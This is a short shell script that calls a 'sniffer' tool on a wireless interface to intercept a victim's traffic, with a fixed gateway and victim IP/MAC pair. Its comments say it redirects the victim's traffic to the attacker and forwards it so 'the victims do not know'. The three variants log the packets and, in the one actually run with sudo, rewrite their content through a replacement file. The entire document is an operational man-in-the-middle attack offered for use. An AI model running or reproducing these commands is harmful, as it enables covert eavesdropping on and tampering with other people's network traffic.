
# Forward the traffic so the victims do not know that someting
# is happening.

a="./sniffer \
wlan0 \
192.168.43.1 \
b4:3a:28:63:e6:ab \
192.168.43.108 \
54:e6:fc:8e:b9:99"
#sudo $a




# Redirects the victim traffic to the attacker with first command.
# Then bridge log the traffic to the standard output and forward
# them so the victims do not know that someting is happening.

b="./sniffer \
wlan0 \
192.168.43.1 \
b4:3a:28:63:e6:ab \
192.168.43.108 \
54:e6:fc:8e:b9:99 \
- \
/dev/stdout"
#sudo $b




# Redirects the victims traffic to the attacker with first command.
# Then injects all IPv4 packets by replacing string apple with linux,
# log the packets to the *log.txt* file and forward them so the victims
# do not know that someting is happening.

c="./sniffer \
wlan0 \
192.168.43.1 \
b4:3a:28:63:e6:ab \
192.168.43.108 \
54:e6:fc:8e:b9:99 \
replace.txt \
log.txt"
sudo $c



